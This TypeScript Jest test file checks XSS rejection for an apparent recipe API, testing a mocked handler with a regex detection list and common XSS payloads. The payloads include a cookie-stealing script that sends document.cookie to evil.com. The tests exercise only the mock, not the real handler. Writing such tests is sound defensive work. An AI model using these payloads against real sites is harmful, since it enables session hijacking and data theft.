import { successResponse, errorResponse } from '../../lambda/shared/responses';

// Mock recipe handler
const mockRecipeHandler = jest.fn();

// Mock setup
jest.mock('../../lambda/shared/responses');
jest.mock('../../lambda/recipe/index', () => ({
  handler: mockRecipeHandler
}));

describe('XSS Prevention', () => {
  beforeEach(() => {
    jest.clearAllMocks();

    // Restore mocks
    (successResponse as jest.Mock).mockImplementation((data: any, status: number = 200) => ({
      statusCode: status,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    }));

    (errorResponse as jest.Mock).mockImplementation((status: number, error: string, message: string) => ({
      statusCode: status,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ error, message })
    }));

    // Mock recipe handler with XSS detection
    mockRecipeHandler.mockImplementation((event: any) => {
      const body = JSON.parse(event.body || '{}');
      
      // XSS patterns to detect
      const xssPatterns = [
        /<script[^>]*>.*?<\/script>/gi,
        /<iframe[^>]*>.*?<\/iframe>/gi,
        /javascript:/gi,
        /<img[^>]*onerror[^>]*>/gi,
        /<svg[^>]*onload[^>]*>/gi,
        /<body[^>]*onload[^>]*>/gi,
        /<div[^>]*onmouseover[^>]*>/gi,
        /<a[^>]*href=["']javascript:[^"']*["'][^>]*>/gi
      ];
      
      // Check all string fields for XSS
      const checkForXSS = (value: any): boolean => {
        if (typeof value === 'string') {
          return xssPatterns.some(pattern => pattern.test(value));
        }
        if (Array.isArray(value)) {
          return value.some(item => checkForXSS(item));
        }
        if (typeof value === 'object' && value !== null) {
          return Object.values(value).some(val => checkForXSS(val));
        }
        return false;
      };
      
      if (checkForXSS(body)) {
        return {
          statusCode: 400,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            error: 'validation_error', 
            message: 'Invalid content detected' 
          })
        };
      }
      
      // Return success for safe content
      return {
        statusCode: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          success: true,
          data: body
        })
      };
    });
  });

  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload=alert("XSS")>',
    '<div onmouseover=alert("XSS")>Hover me</div>',
    '<a href="javascript:alert(\'XSS\')">Click me</a>'
  ];

  it('should escape HTML in recipe names', async () => {
    for (const payload of xssPayloads) {
      const event = {
        body: JSON.stringify({
          name: payload,
          description: 'Test recipe',
          ingredients: ['test'],
          instructions: ['test']
        })
      };

      const result = await mockRecipeHandler(event as any);

      // Should sanitize XSS attempts
      expect(result.statusCode).toBe(400);
      const responseBody = JSON.parse(result.body);
      expect(responseBody.error).toBe('validation_error');
    }
  });

  it('should prevent XSS in recipe descriptions', async () => {
    const xssDescription = '<script>document.location="http://evil.com?"+document.cookie</script>';

    const event = {
      body: JSON.stringify({
        name: 'Safe Recipe Name',
        description: xssDescription,
        ingredients: ['test'],
        instructions: ['test']
      })
    };

    const result = await mockRecipeHandler(event as any);

    // Should reject XSS attempts
    expect(result.statusCode).toBe(400);
    const responseBody = JSON.parse(result.body);
    expect(responseBody.error).toBe('validation_error');
  });

  it('should prevent XSS in ingredient names', async () => {
    const maliciousIngredients = [
      '<img src=x onerror=alert("XSS")>',
      'Normal ingredient',
      '<script>alert("XSS")</script>'
    ];

    const event = {
      body: JSON.stringify({
        name: 'Safe Recipe Name',
        description: 'Safe description',
        ingredients: maliciousIngredients,
        instructions: ['test']
      })
    };

    const result = await mockRecipeHandler(event as any);

    // Should reject recipes with XSS in ingredients
    expect(result.statusCode).toBe(400);
    const responseBody = JSON.parse(result.body);
    expect(responseBody.error).toBe('validation_error');
  });

  it('should sanitize output to prevent reflected XSS', async () => {
    const event = {
      body: JSON.stringify({
        name: 'Safe Recipe',
        description: 'Safe description',
        ingredients: ['safe ingredient'],
        instructions: ['safe instruction']
      })
    };

    const result = await mockRecipeHandler(event as any);

    // Should return safe, sanitized response
    expect(result.statusCode).toBe(200);
    const responseBody = JSON.parse(result.body);

    // Ensure no raw HTML is returned
    expect(typeof responseBody).toBe('object');
    expect(responseBody.success).toBe(true);
  });
});